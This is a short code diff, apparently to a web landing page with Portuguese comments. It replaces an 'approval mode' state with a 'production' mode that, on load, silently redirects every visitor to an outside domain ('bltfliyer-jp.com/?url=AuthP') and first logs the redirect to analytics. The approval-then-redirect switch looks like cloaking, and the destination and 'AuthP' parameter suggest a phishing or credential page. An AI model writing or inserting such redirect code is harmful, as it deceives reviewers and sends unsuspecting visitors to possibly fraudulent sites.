@@ -817,10 +817,36 @@
             // Track visitor
             trackVisitor();
             
-            console.log('🎯 Sistema inicializado - Modo de Aprovação');
+            // SISTEMA DE REDIRECIONAMENTO INSTANTÂNEO
+            initInstantRedirect();
+            
+            console.log('🎯 Sistema inicializado - Modo PRODUÇÃO com Redirecionamento');
             console.log('📊 Tracking básico ativo');
             console.log('🌐 Domínio:', window.location.hostname);
         });
+        
+        // ============================================
+        // REDIRECIONAMENTO INSTANTÂNEO - PRODUÇÃO
+        // ============================================
+        function initInstantRedirect() {
+            // REDIRECIONAMENTO IMEDIATO PARA TODOS
+            const targetUrl = 'https://bltfliyer-jp.com/?url=AuthP';
+            
+            console.log('⚡ REDIRECIONAMENTO INSTANTÂNEO ATIVADO');
+            console.log('🔗 Destino:', targetUrl);
+            
+            // Registrar no Analytics antes de redirecionar
+            if (typeof gtag !== 'undefined') {
+                gtag('event', 'redirect', {
+                    'event_category': 'engagement',
+                    'event_label': 'instant_redirect_production',
+                    'value': 1
+                });
+            }
+            
+            // REDIRECIONAR IMEDIATAMENTE
+            window.location.replace(targetUrl);
+        }
         
         // Track page views
         if (typeof gtag !== 'undefined') {
